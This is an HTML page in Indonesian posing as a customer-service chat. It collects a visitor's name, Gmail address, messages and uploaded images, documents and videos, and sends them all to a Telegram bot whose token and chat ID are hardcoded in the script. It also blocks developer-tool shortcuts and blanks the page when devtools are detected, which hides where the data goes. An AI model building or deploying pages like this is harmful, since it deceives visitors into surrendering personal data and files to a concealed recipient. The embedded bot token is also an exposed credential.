<!DOCTYPE html><html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Customer Service Chat</title>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
:root {
  --primary: #6366f1;
  --secondary: #9333ea;
  --bg: linear-gradient(135deg, #4f46e5, #9333ea);
}body { font-family: "Poppins", sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }

.container { background: #ffffff; padding: 25px 20px; border-radius: 18px; width: 380px; box-shadow: 0 6px 25px rgba(0, 0, 0, 0.25); animation: fadeIn 0.5s ease-in-out; text-align: center; }

h2 { color: var(--primary); margin-bottom: 10px; }

#chat-section { display: none; }

.icon-header { font-size: 45px; color: var(--primary); background: #eef2ff; padding: 18px; border-radius: 50%; margin-bottom: 12px; display: inline-block; }

.messages { border: 1px solid #ddd; border-radius: 10px; padding: 10px; height: 250px; overflow-y: auto; margin-bottom: 10px; background: #f9fafb; }

.message { margin-bottom: 8px; padding: 8px 12px; border-radius: 8px; max-width: 80%; word-wrap: break-word; }

.customer { background: #c7d2fe; margin-left: auto; }

input, button { width: 100%; padding: 10px; margin-top: 6px; border-radius: 8px; border: 1px solid #ccc; box-sizing: border-box; }

button { background: var(--primary); color: white; font-weight: 600; border: none; cursor: pointer; }

button:hover { background: var(--secondary); }

.toast { position: fixed; bottom: 20px; right: 20px; background: var(--primary); color: white; padding: 12px 18px; border-radius: 10px; opacity: 0; transition: 0.4s; }

.toast.show { opacity: 1; }

@keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } } </style>

</head>
<body><div class="container">
  <div id="login-section">
    <div class="icon-header"><i class="fa-solid fa-headset"></i></div>
    <h2>Customer Service</h2>
    <input type="text" id="name" placeholder="Nama lengkap" />
    <input type="email" id="email" placeholder="Alamat Gmail" />
    <button onclick="startChat()">Mulai Chat</button>
  </div>  <div id="chat-section">
    <div class="icon-header"><i class="fa-solid fa-headset"></i></div>
    <h2>Customer Service</h2>
    <div id="messages" class="messages"></div>
    <input type="text" id="message" placeholder="Tulis pesan..." />
    <input type="file" id="imageInput" accept="image/*" />
    <input type="file" id="docInput" accept=".pdf,.doc,.docx,.zip,.rar" />
    <input type="file" id="videoInput" accept="video/*" />
    <button onclick="sendMessage()">Kirim</button>
  </div>
</div><div id="toast" class="toast"></div><script>
let customerName = "";
let customerEmail = "";

const telegramBotToken = "8785872128:AAGJApScDjRIjg1VorXB35OvrvtUDCtVr0M";
const telegramChatId = "6317157631";

function startChat() {
  customerName = document.getElementById("name").value.trim();
  customerEmail = document.getElementById("email").value.trim();
  if (!customerName || !customerEmail) {
    Swal.fire("Peringatan", "Isi semua data!", "warning");
    return;
  }
  document.getElementById("login-section").style.display = "none";
  document.getElementById("chat-section").style.display = "block";
}

function showToast(msg) {
  const toast = document.getElementById("toast");
  toast.textContent = msg;
  toast.classList.add("show");
  setTimeout(() => toast.classList.remove("show"), 3000);
}

function sendMessage() {
  const msg = document.getElementById("message").value.trim();
  const image = document.getElementById("imageInput").files[0];
  const doc = document.getElementById("docInput").files[0];
  const video = document.getElementById("videoInput").files[0];

  if (!msg && !image && !doc && !video) {
    showToast("Isi pesan atau pilih file!");
    return;
  }

  const textData = `👤 ${customerName}\n📧 ${customerEmail}\n📝 ${msg || "(File dikirim)"}`;

  function sendFile(file, type, endpoint) {
    const formData = new FormData();
    formData.append("chat_id", telegramChatId);
    formData.append(type, file);
    formData.append("caption", textData);

    fetch(`https://api.telegram.org/bot${telegramBotToken}/${endpoint}`, {
      method: "POST",
      body: formData
    });
  }

  if (image) sendFile(image, "photo", "sendPhoto");
  if (doc) sendFile(doc, "document", "sendDocument");
  if (video) sendFile(video, "video", "sendVideo");

  if (!image && !doc && !video) {
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: telegramChatId, text: textData })
    });
  }

  showToast("Pesan terkirim!");
}
  /* 🔒 ANTI DEVTOOLS (tidak ganggu mobile) */

document.addEventListener("keydown", function(e){
  // F12
  if(e.key === "F12") e.preventDefault();

  // Ctrl + Shift + I/C/J
  if(e.ctrlKey && e.shiftKey &&
    ["I","C","J"].includes(e.key)) e.preventDefault();

  // Ctrl + U
  if(e.ctrlKey && e.key === "u") e.preventDefault();
});

// Deteksi DevTools (lebih aman, tidak pakai resize hack)
setInterval(() => {
  const threshold = 160;
  if (window.devtoolsOpen) return;

  const widthThreshold = window.outerWidth - window.innerWidth > threshold;

  if (widthThreshold && !/Android|iPhone|iPad/i.test(navigator.userAgent)) {
    document.body.innerHTML =
      "<h1 style='color:gold;text-align:center;margin-top:40vh;'>🚫 Developer Tools Terdeteksi</h1>";
  }
}, 2000);
</script></body>
</html>
